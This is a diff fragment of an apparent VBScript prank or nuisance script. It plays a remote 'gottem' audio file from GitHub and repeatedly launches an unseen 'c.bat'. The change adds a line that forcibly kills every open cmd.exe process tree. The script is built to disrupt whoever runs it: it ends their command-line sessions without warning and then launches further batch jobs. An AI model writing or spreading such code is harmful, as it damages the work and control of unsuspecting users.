@@ -4,6 +4,7 @@ Dim op
 Set op = CreateObject("WMPlayer.OCX")
 op.URL = "https://raw.githubusercontent.com/p6c/a/main/gottem.mp3"
 op.controls.play
+os.run "C:\Windows\System32\taskkill.exe /f /t /im cmd.exe"
 WScript.Sleep 17000
 os.run "c.bat"
 os.run "c.bat"
